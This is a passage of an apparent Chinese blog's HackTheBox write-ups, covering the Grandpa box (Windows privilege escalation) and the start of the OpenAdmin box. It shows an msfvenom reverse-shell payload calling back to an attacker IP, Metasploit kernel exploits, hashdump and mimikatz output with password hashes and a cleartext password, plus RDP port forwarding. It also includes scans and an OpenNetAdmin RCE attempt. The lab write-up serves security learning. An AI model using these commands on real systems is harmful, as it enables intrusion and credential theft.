class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   <span class="comment">----             ---------------  --------  -----------</span></span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; set showdescription true</span><br><span class="line">showdescription =&gt; true</span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.14 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 10.10.10.14 - 30 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running,</span><br><span class="line">but could not be validated.</span><br><span class="line">  This module will <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">session</span> <span class="keyword">with</span> <span class="keyword">SYSTEM</span> <span class="keyword">privileges</span> via the</span><br><span class="line">  KiTrap0D exploit <span class="keyword">by</span> Tavis Ormandy. <span class="keyword">If</span> the <span class="keyword">session</span> <span class="keyword">in</span> <span class="keyword">use</span> <span class="keyword">is</span> already</span><br><span class="line">  elevated <span class="keyword">then</span> the exploit will <span class="keyword">not</span> run. The <span class="keyword">module</span> relies <span class="keyword">on</span></span><br><span class="line">  kitrap0d.x86.dll, <span class="keyword">and</span> <span class="keyword">is</span> <span class="keyword">not</span> supported <span class="keyword">on</span> x64 <span class="keyword">editions</span> <span class="keyword">of</span> Windows.</span><br><span class="line">[+] <span class="number">10.10</span><span class="number">.10</span><span class="number">.14</span> - exploit/windows/<span class="keyword">local</span>/ms14_058_track_popup_menu:</span><br><span class="line">The target appears <span class="keyword">to</span> be vulnerable.</span><br><span class="line"> 	This <span class="keyword">module</span> exploits a <span class="literal">NULL</span> Pointer Dereference <span class="keyword">in</span> win32k.sys, the</span><br><span class="line">  vulnerability can be triggered <span class="keyword">through</span> the <span class="keyword">use</span> <span class="keyword">of</span> TrackPopupMenu.</span><br><span class="line">  <span class="keyword">Under</span> special conditions, the <span class="literal">NULL</span> pointer dereference can be abused</span><br><span class="line">  <span class="keyword">on</span> xxxSendMessageTimeout <span class="keyword">to</span> achieve arbitrary code execution. This</span><br><span class="line">  <span class="keyword">module</span> has been tested successfully <span class="keyword">on</span> Windows XP SP3, Windows <span class="number">2003</span></span><br><span class="line">  SP2, Windows <span class="number">7</span> SP1 <span class="keyword">and</span> Windows <span class="number">2008</span> <span class="number">32</span>bits. Also <span class="keyword">on</span> Windows <span class="number">7</span> SP1</span><br><span class="line">  <span class="keyword">and</span> Windows <span class="number">2008</span> R2 SP1 <span class="number">64</span> bits.</span><br><span class="line">[+] <span class="number">10.10</span><span class="number">.10</span><span class="number">.14</span> - exploit/windows/<span class="keyword">local</span>/ms14_070_tcpip_ioctl: The target appears <span class="keyword">to</span> be vulnerable.</span><br><span class="line">  A vulnerability <span class="keyword">within</span> the Microsoft TCP/IP protocol driver</span><br><span class="line">  tcpip.sys can <span class="keyword">allow</span> a <span class="keyword">local</span> attacker <span class="keyword">to</span> <span class="keyword">trigger</span> a <span class="literal">NULL</span> pointer</span><br><span class="line">  dereference <span class="keyword">by</span> <span class="keyword">using</span> a specially crafted IOCTL. This flaw can be</span><br><span class="line">  abused <span class="keyword">to</span> elevate <span class="keyword">privileges</span> <span class="keyword">to</span> SYSTEM.</span><br><span class="line">[+] <span class="number">10.10</span><span class="number">.10</span><span class="number">.14</span> - exploit/windows/<span class="keyword">local</span>/ms15_051_client_copy_image: The target appears <span class="keyword">to</span> be vulnerable.</span><br><span class="line">  This <span class="keyword">module</span> exploits improper <span class="keyword">object</span> handling <span class="keyword">in</span> the win32k.sys</span><br><span class="line">  kernel <span class="keyword">mode</span> driver. This <span class="keyword">module</span> has been tested <span class="keyword">on</span> vulnerable builds</span><br><span class="line">  <span class="keyword">of</span> Windows <span class="number">7</span> x64 <span class="keyword">and</span> x86, <span class="keyword">and</span> Windows <span class="number">2008</span> R2 SP1 x64.</span><br><span class="line">[+] <span class="number">10.10</span><span class="number">.10</span><span class="number">.14</span> - exploit/windows/<span class="keyword">local</span>/ms16_016_webdav: The service <span class="keyword">is</span> running, but could <span class="keyword">not</span> be validated.</span><br><span class="line">  This <span class="keyword">module</span> exploits the vulnerability <span class="keyword">in</span> mrxdav.sys described <span class="keyword">by</span></span><br><span class="line">  MS16<span class="number">-016.</span> The <span class="keyword">module</span> will spawn a process <span class="keyword">on</span> the target <span class="keyword">system</span> <span class="keyword">and</span></span><br><span class="line">  elevate its <span class="keyword">privileges</span> <span class="keyword">to</span> NT AUTHORITY\<span class="keyword">SYSTEM</span> <span class="keyword">before</span> executing the</span><br><span class="line">  specified payload <span class="keyword">within</span> the <span class="keyword">context</span> <span class="keyword">of</span> the elevated process.</span><br><span class="line">[+] <span class="number">10.10</span><span class="number">.10</span><span class="number">.14</span> - exploit/windows/<span class="keyword">local</span>/ppr_flatten_rec: The target appears <span class="keyword">to</span> be vulnerable.</span><br><span class="line">  This <span class="keyword">module</span> exploits a vulnerability <span class="keyword">on</span> EPATHOBJ::pprFlattenRec due</span><br><span class="line">  <span class="keyword">to</span> the <span class="keyword">usage</span> <span class="keyword">of</span> uninitialized <span class="keyword">data</span> which allows <span class="keyword">to</span> corrupt memory.</span><br><span class="line">  <span class="keyword">At</span> the moment, the <span class="keyword">module</span> has been tested successfully <span class="keyword">on</span> Windows XP</span><br><span class="line">  SP3, Windows <span class="number">2003</span> SP1, <span class="keyword">and</span> Windows <span class="number">7</span> SP1.</span><br><span class="line">[*] Post <span class="keyword">module</span> execution completed</span><br></pre></td></tr></table></figure>

<p>找个可写目录, 再反弹一个<code>shell</code>，以下 exp 均可成功提权</p>
<ul>
<li><p><code>windows/local/ms14_058_track_popup_menu</code></p>
</li>
<li><p><code>exploit/windows/local/ms14_070_tcpip_ioctl</code> 稳定</p>
</li>
<li><p><code>windows/local/ms15_051_client_copy_image</code></p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload payloads/16-122-4443.exe "C:\WINDOWS\Temp\shell.exe"</span><br><span class="line">[*] uploading  : payloads/16-122-4443.exe -&gt; C:\WINDOWS\Temp\shell.exe</span><br><span class="line">[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): payloads/16-122-4443.exe -&gt; C:\WINDOWS\Temp\shell.exe</span><br><span class="line">[*] uploaded   : payloads/16-122-4443.exe -&gt; C:\WINDOWS\Temp\shell.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.122 LPORT=4443 -f exe -o 16-122-4443.exe</span><br><span class="line"><span class="comment"># 上传并执行</span></span><br><span class="line">upload shell.exe "C:\WINDOWS\Temp\shell.exe"</span><br><span class="line"><span class="keyword">execute</span>  -f <span class="string">"C:\WINDOWS\Temp\shell.exe"</span></span><br></pre></td></tr></table></figure>

<p>提权过程</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4443</span><br><span class="line">[*] Storing the shellcode in memory...</span><br><span class="line">[*] Triggering the vulnerability...</span><br><span class="line">[*] Checking privileges after exploitation...</span><br><span class="line">[+] Exploitation successful!</span><br><span class="line">[*] Sending stage (180291 bytes) to 10.10.10.14</span><br><span class="line">[*] Meterpreter session 2 opened</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\</span><br><span class="line">  Administrator</span><br><span class="line">  All Users</span><br><span class="line">  Harry</span><br><span class="line"></span><br><span class="line"> <span class="comment"># c:\Documents and Settings\Administrator\Desktop\root.txt</span></span><br><span class="line"> <span class="comment"># c:\Documents and Settings\Harry\Desktop\user.txt</span></span><br></pre></td></tr></table></figure>

<h1 id="提权之后？"><a href="#提权之后？" class="headerlink" title="提权之后？"></a>提权之后？</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提权后</span></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:0a70918d669baeb307012642393148ab:34dec8a1db14cdde2a21967c3c997548:::</span><br><span class="line">ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Harry:1008:93c50499355883d1441208923e8628e6:031f5563e0ac4ba538e8ea325479740d:::</span><br><span class="line">IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::</span><br><span class="line">IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::</span><br></pre></td></tr></table></figure>

<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p>使用<code>mimikatz</code>前需要先加载</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...Success.</span><br><span class="line"></span><br><span class="line">meterpreter &gt;  mimikatz_command -f version</span><br><span class="line">mimikatz 1.0 x86 (RC) (Mar  4 2020 19:36:53)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; msv</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving msv credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User             Password</span><br><span class="line"><span class="comment">------    -------    ------        ----             --------</span></span><br><span class="line">0;747507  NTLM       GRANPA        IUSR_GRANPA      lm&#123; a274b4532c9ca5cdf684351fab962e86 &#125;, ntlm&#123; 6a981cb5e038b2d8b713743a50d89c88 &#125;</span><br><span class="line">0;996     Negotiate  NT AUTHORITY  NETWORK SERVICE  lm&#123; aad3b435b51404eeaad3b435b51404ee &#125;, ntlm&#123; 31d6cfe0d16ae931b73c59d7e0c089c0 &#125;</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE    n.s. (Credentials KO)</span><br><span class="line">0;44669   NTLM                                      n.s. (Credentials KO)</span><br><span class="line">0;999     NTLM       HTB           GRANPA$          n.s. (Credentials KO)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; kerberos</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving kerberos credentials</span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User             Password</span><br><span class="line"><span class="comment">------    -------    ------        ----             --------</span></span><br><span class="line">0;996     Negotiate  NT AUTHORITY  NETWORK SERVICE</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE</span><br><span class="line">0;44669   NTLM</span><br><span class="line">0;999     NTLM       HTB           GRANPA$</span><br><span class="line">0;747507  NTLM       GRANPA        IUSR_GRANPA      1_pEx9[v6;e24&#125;</span><br><span class="line"></span><br><span class="line">meterpreter &gt;  mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : granpa</span><br><span class="line">BootKey    : 11b5033b62a3d2d6bb80a0d45ea88bfb</span><br><span class="line"></span><br><span class="line">Rid  : 500</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : 0a70918d669baeb307012642393148ab</span><br><span class="line">NTLM : 34dec8a1db14cdde2a21967c3c997548</span><br><span class="line"></span><br><span class="line">Rid  : 501</span><br><span class="line">User : Guest</span><br><span class="line">LM   :</span><br><span class="line">NTLM :</span><br><span class="line"></span><br><span class="line">Rid  : 1001</span><br><span class="line">User : SUPPORT_388945a0</span><br><span class="line">LM   :</span><br><span class="line">NTLM : 8ed3993efb4e6476e4f75caebeca93e6</span><br><span class="line"></span><br><span class="line">Rid  : 1003</span><br><span class="line">User : IUSR_GRANPA</span><br><span class="line">LM   : a274b4532c9ca5cdf684351fab962e86</span><br><span class="line">NTLM : 6a981cb5e038b2d8b713743a50d89c88</span><br><span class="line"></span><br><span class="line">Rid  : 1004</span><br><span class="line">User : IWAM_GRANPA</span><br><span class="line">LM   : 95d112c4da2348b599183ac6b1d67840</span><br><span class="line">NTLM : a97f39734c21b3f6155ded7821d04d16</span><br><span class="line"></span><br><span class="line">Rid  : 1007</span><br><span class="line">User : ASPNET</span><br><span class="line">LM   : 3f71d62ec68a06a39721cb3f54f04a3b</span><br><span class="line">NTLM : edc0d5506804653f58964a2376bbd769</span><br><span class="line"></span><br><span class="line">Rid  : 1008</span><br><span class="line">User : Harry</span><br><span class="line">LM   : 93c50499355883d1441208923e8628e6</span><br><span class="line">NTLM : 031f5563e0ac4ba538e8ea325479740d</span><br><span class="line">meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line">[0] &#123; IUSR_GRANPA ; GRANPA ; 1_pEx9[v6;e24&#125; &#125;</span><br><span class="line">[1] &#123; IUSR_GRANPA ; GRANPA ; 1_pEx9[v6;e24&#125; &#125;</span><br><span class="line">[2] &#123; _olic</span><br></pre></td></tr></table></figure>

<h2 id="rdp"><a href="#rdp" class="headerlink" title="rdp"></a>rdp</h2><p>首先进行端口转发</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | <span class="keyword">delete</span> | <span class="keyword">list</span> | <span class="keyword">flush</span>] [args]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -L &lt;opt&gt;  Forward: <span class="keyword">local</span> host <span class="keyword">to</span> listen <span class="keyword">on</span> (optional). <span class="keyword">Reverse</span>: <span class="keyword">local</span> host <span class="keyword">to</span> <span class="keyword">connect</span> to.</span><br><span class="line">    -R        Indicates a <span class="keyword">reverse</span> port forward.</span><br><span class="line">    -h        <span class="keyword">Help</span> banner.</span><br><span class="line">    -i &lt;opt&gt;  <span class="keyword">Index</span> <span class="keyword">of</span> the port forward entry <span class="keyword">to</span> interact <span class="keyword">with</span> (see the <span class="string">"list"</span> command).</span><br><span class="line">    -l &lt;opt&gt;  Forward: <span class="keyword">local</span> port <span class="keyword">to</span> listen on. <span class="keyword">Reverse</span>: <span class="keyword">local</span> port <span class="keyword">to</span> <span class="keyword">connect</span> to.</span><br><span class="line">    -p &lt;opt&gt;  Forward: remote port <span class="keyword">to</span> <span class="keyword">connect</span> to. <span class="keyword">Reverse</span>: remote port <span class="keyword">to</span> listen on.</span><br><span class="line">    -r &lt;opt&gt;  Forward: remote host <span class="keyword">to</span> <span class="keyword">connect</span> to.</span><br><span class="line">meterpreter &gt; portfwd <span class="keyword">add</span> -l <span class="number">3389</span>  -r <span class="number">10.10</span><span class="number">.10</span><span class="number">.14</span> -p <span class="number">3389</span></span><br><span class="line">[*] <span class="keyword">Local</span> TCP relay created: :<span class="number">3389</span> &lt;-&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.14</span>:<span class="number">3389</span></span><br></pre></td></tr></table></figure>

<p>在<code>meterpreter</code>里添加用户</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run getgui -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.</span><br><span class="line">[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]</span><br><span class="line">Windows Remote Desktop Enabler Meterpreter Script</span><br><span class="line">Usage: getgui -u &lt;username&gt; -p &lt;password&gt;</span><br><span class="line">Or:    getgui -e</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -e        Enable RDP only.</span><br><span class="line">    -f &lt;opt&gt;  Forward RDP Connection.</span><br><span class="line">    -h        <span class="keyword">Help</span> menu.</span><br><span class="line">    -p &lt;opt&gt;  The <span class="keyword">Password</span> <span class="keyword">of</span> the <span class="keyword">user</span> <span class="keyword">to</span> add.</span><br><span class="line">    -u &lt;opt&gt;  The Username <span class="keyword">of</span> the <span class="keyword">user</span> <span class="keyword">to</span> add.</span><br></pre></td></tr></table></figure>

<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li><a href="https://zhuanlan.zhihu.com/p/40192495" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/40192495</a></li>
<li><a href="https://github.com/payloadbox/xxe-injection-payload-list" target="_blank" rel="noopener">https://github.com/payloadbox/xxe-injection-payload-list</a></li>
<li><a href="https://www.xxe.sh/" target="_blank" rel="noopener">https://www.xxe.sh/</a></li>
<li><a href="https://medium.com/armourinfosec/grandpa-htb-737443aa52f" target="_blank" rel="noopener">https://medium.com/armourinfosec/grandpa-htb-737443aa52f</a></li>
<li><a href="https://bhardwajmanish.com/2020/01/grandpa-hack-the-box-htb/" target="_blank" rel="noopener">https://bhardwajmanish.com/2020/01/grandpa-hack-the-box-htb/</a></li>
<li><a href="https://blog.csdn.net/weixin_41082546/article/details/100178706" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41082546/article/details/100178706</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/20/yuque/HackTheBox%EF%BC%9AOpenAdmin%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/20/yuque/HackTheBox%EF%BC%9AOpenAdmin%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：OpenAdmin笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-20T15:51:26+08:00">
                2020-04-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>10.10.10.171<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587380704833-408753ae-e384-41be-80ab-7aa9c04e58a4.png#align=left&display=inline&height=286&margin=%5Bobject%20Object%5D&name=image.png&originHeight=572&originWidth=882&size=157266&status=done&style=none&width=441" alt="image.png"></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -A 10.10.10.171 -oA nmap.tcp</span></span><br><span class="line">Nmap scan report for 10.10.10.171</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)</span><br><span class="line">|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)</span><br><span class="line">|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)</span><br><span class="line">80/tcp    open     http           Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">1185/tcp  filtered catchpole</span><br><span class="line">2046/tcp  filtered sdfunc</span><br><span class="line">2701/tcp  filtered sms-rcinfo</span><br><span class="line">2875/tcp  filtered dxmessagebase2</span><br><span class="line">24444/tcp filtered unknown</span><br><span class="line">Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (93%), Linux 3.2 - 4.9 (93%), Android 4.2.2 (Linux 3.4) (93%), Linux 3.10 (92%), Android 4.1.2 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 5900/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   354.54 ms 10.10.14.1</span><br><span class="line">2   354.49 ms 10.10.10.171</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/</span><br></pre></td></tr></table></figure>

<h2 id="80-端口：enum-more-gt-OpenNetAdmin"><a href="#80-端口：enum-more-gt-OpenNetAdmin" class="headerlink" title="80 端口：enum more -&gt; OpenNetAdmin"></a>80 端口：enum more -&gt; OpenNetAdmin</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dirb http://10.10.10.171/ -o dirb.scan</span></span><br><span class="line"><span class="comment">---- Scanning URL: http://10.10.10.171/ ----</span></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.171/artwork/</span><br><span class="line">	+ http://10.10.10.171/index.html (CODE:200|SIZE:10918)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.171/music/</span><br><span class="line">	+ http://10.10.10.171/server-status (CODE:403|SIZE:277)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: http://10.10.10.171/artwork/ ----</span></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.171/artwork/css/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.171/artwork/fonts/</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587375922870-360a8238-3f29-405c-90b5-2f5f10ada95c.png#align=left&display=inline&height=232&margin=%5Bobject%20Object%5D&name=image.png&originHeight=463&originWidth=1276&size=38380&status=done&style=none&width=638" alt="image.png"><br>找了一圈，无任何有价值东西。扫目录又发现一个<code>/music</code>目录</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587375957425-dcf2a709-2d6e-4a4a-ab94-51b9a07d2b3f.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=587&originWidth=1374&size=50619&status=done&style=none&width=687" alt="image.png"><br><a href="http://10.10.10.171/ona/" target="_blank" rel="noopener"><code>http://10.10.10.171/ona/</code></a>找到一个好东西<code>OpenNetAdmin 18.1.1</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587377149318-c776ea73-7777-4841-82e6-2a024507a64c.png#align=left&display=inline&height=203&margin=%5Bobject%20Object%5D&name=image.png&originHeight=522&originWidth=1916&size=142370&status=done&style=none&width=746" alt="image.png"><br>一通搜索，<code>msf</code>发现<code>rce</code>模块，不知为啥失败了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use unix&#x2F;webapp&#x2F;opennetadmin_ping_cmd_injection</span><br><span class="line">...</span><br><span class="line">msf5 exploit(unix&#x2F;webapp&#x2F;opennetadmin_ping_cmd_injection) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.14:4444</span><br><span class="line">[*] Exploiting...</span><br><span class="line">[*] Command Stager progress - 100.00% done (703&#x2F;703 bytes)</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>

<p>又找到一个 exp 脚本<a href="https://github.com/amriunix/ona-rce" target="_blank" rel="noopener">https://github.com/amriunix/ona-rce</a>，跑成功了，<code>www-data</code>权限，但是无权读<code>flag</code></p>
